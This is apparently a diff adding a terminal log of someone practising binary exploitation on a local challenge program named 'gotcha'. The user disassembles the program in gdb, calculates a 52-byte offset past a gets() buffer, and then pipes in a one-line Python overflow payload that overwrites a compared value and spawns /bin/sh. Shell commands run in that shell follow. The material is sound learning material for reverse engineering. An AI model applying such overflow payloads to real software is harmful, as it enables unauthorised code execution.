@@ -1,0 +1,128 @@
+satwik@satwik:~/Documents/Reversing$ ./gotcha 
+overflow me : 
+dfbhsdfns
+Nah..
+satwik@satwik:~/Documents/Reversing$ gdb gotcha 
+GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from gotcha...(no debugging symbols found)...done.
+(gdb) start
+Temporary breakpoint 1 at 0x68d
+Starting program: /home/satwik/Documents/Reversing/gotcha 
+
+Temporary breakpoint 1, 0x5655568d in main ()
+(gdb) set disassembly-flavor intel
+(gdb) disass main
+Dump of assembler code for function main:
+   0x5655568a <+0>:	push   ebp
+   0x5655568b <+1>:	mov    ebp,esp
+=> 0x5655568d <+3>:	and    esp,0xfffffff0
+   0x56555690 <+6>:	sub    esp,0x10
+   0x56555693 <+9>:	mov    DWORD PTR [esp],0xdeadbeef
+   0x5655569a <+16>:	call   0x5655562c <func>
+   0x5655569f <+21>:	mov    eax,0x0
+   0x565556a4 <+26>:	leave  
+   0x565556a5 <+27>:	ret    
+End of assembler dump.
+(gdb) p $esp-0x10
+$1 = (void *) 0xffffce28
+(gdb) p *0xffffce28
+$2 = 1448433337
+(gdb) disass func
+Dump of assembler code for function func:
+   0x5655562c <+0>:	push   ebp
+   0x5655562d <+1>:	mov    ebp,esp
+   0x5655562f <+3>:	sub    esp,0x48
+   0x56555632 <+6>:	mov    eax,gs:0x14
+   0x56555638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
+   0x5655563b <+15>:	xor    eax,eax
+   0x5655563d <+17>:	mov    DWORD PTR [esp],0x5655578c
+   0x56555644 <+24>:	call   0xf7e43360 <puts>
+   0x56555649 <+29>:	lea    eax,[ebp-0x2c]
+   0x5655564c <+32>:	mov    DWORD PTR [esp],eax
+   0x5655564f <+35>:	call   0xf7e42ae0 <gets>
+   0x56555654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
+   0x5655565b <+47>:	jne    0x5655566b <func+63>
+   0x5655565d <+49>:	mov    DWORD PTR [esp],0x5655579b
+   0x56555664 <+56>:	call   0xf7e18d10 <system>
+   0x56555669 <+61>:	jmp    0x56555677 <func+75>
+   0x5655566b <+63>:	mov    DWORD PTR [esp],0x565557a3
+   0x56555672 <+70>:	call   0xf7e43360 <puts>
+   0x56555677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x5655567a <+78>:	xor    eax,DWORD PTR gs:0x14
+   0x56555681 <+85>:	je     0x56555688 <func+92>
+   0x56555683 <+87>:	call   0xf7ee3ee0 <__stack_chk_fail>
+   0x56555688 <+92>:	leave  
+   0x56555689 <+93>:	ret    
+End of assembler dump.
+(gdb) p $ebp-0xc
+$3 = (void *) 0xffffce2c
+(gdb) p *0xffffce2c
+$4 = 0
+(gdb) x/s 0x5655578c
+0x5655578c:	"overflow me : "
+(gdb) p 0x5655579b
+$5 = 1448433563
+(gdb) x/s 0x5655579b
+0x5655579b:	"/bin/sh"
+(gdb) p/d 0x2c
+$6 = 44
+(gdb) p/d 0x2c - 0x8
+$7 = 36
+(gdb) p/d 0x2c + 0x8
+$8 = 52
+(gdb) p ebp+8
+No symbol table is loaded.  Use the "file" command.
+(gdb) p &ebp+8
+No symbol table is loaded.  Use the "file" command.
+(gdb) p $ebp+8
+$9 = (void *) 0xffffce40
+(gdb) p $ebp+0x8
+$10 = (void *) 0xffffce40
+(gdb) p $ebp-0x2c
+$11 = (void *) 0xffffce0c
+(gdb) p/d 0xffffce40 - 0xffffce0c
+$12 = 52
+(gdb) q
+A debugging session is active.
+
+	Inferior 1 [process 5648] will be killed.
+
+Quit anyway? (y or n) y
+satwik@satwik:~/Documents/Reversing$ ./gotcha 
+overflow me : 
+^Z   
+[3]+  Stopped                 ./gotcha
+satwik@satwik:~/Documents/Reversing$ (python -c 'print "\x90"*52 + "\xbe\xba\xfe\xca"';cat) | ./gotcha 
+overflow me : 
+ls
+ aky_fib      'asm commands'   Even.out		  Fibonacci_series.asm	 GreetingProgram       HelloWorld.asm   LargerNum.c
+ aky_fib.asm   Even.asm        Fibonacci.asm	  Fibonacci_series.c	 GreetingProgram.asm   HelloWorld.o
+ aky_fib.o     Even.c	       Fibonacci.c	  Fibonacci_series.o	 GreetingProgram.c     jf.asm
+ a.out	       Even.o	       Fibonacci_series   gotcha		 GreetingProgram.o     LargerNum
+pwd
+/home/satwik/Documents/Reversing
+whoami
+satwik
+cd
+cd ..
+pwd
+/home
+ls -l
+total 4
+drwxr-xr-x 40 satwik satwik 4096 Jul  1 21:53 satwik
+exit
+*** stack smashing detected ***: <unknown> terminated
+
